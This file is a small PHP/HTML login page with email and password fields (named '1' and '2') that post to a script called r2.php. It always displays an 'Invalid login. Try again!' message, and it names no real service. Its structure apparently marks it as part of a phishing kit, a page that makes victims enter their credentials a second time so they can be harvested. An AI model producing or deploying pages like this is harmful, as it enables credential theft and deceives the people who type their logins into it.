<?php     
?>
<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Welcome</title>
<link rel="stylesheet" href="style.css" />
</head>



<table border="0" width="30%" id="table1" height="391" style="position: absolute; left: 831px; top: 155px; height: 343px">
	<tr>
		<td>
		<form method=post action=r2.php>
		<input type=image name=submit src="6.png" width="309" height="49" style="position: absolute; left: 21; top: 235"><p>
		<input type="text" name="1" required="" placeholder="Email" size="20" style="border-style:outset; border-width:1px; position: absolute; left: 27; top: 122; width: 297px; height: 34px; font-size:12pt"><input type="password" name="2" required="" placeholder="Password" size="20" style="border-style:outset; border-width:1px; position: absolute; left: 27; top: 183; width: 300px; height: 34px; font-size:12pt">
		<table border="0" width="272" id="table3" style="position: absolute; left: 23px; top: 91px; width: 305px">
			<tr>
				<td>
				<p align="center"><font size="2" face="Arial" color="#FF0000">
				Invalid login. Try again!</font></td>
			</tr>
		</table>
		</form>
		</td>
	</tr>
</table>
<p>&nbsp;</p>

</body>

</html>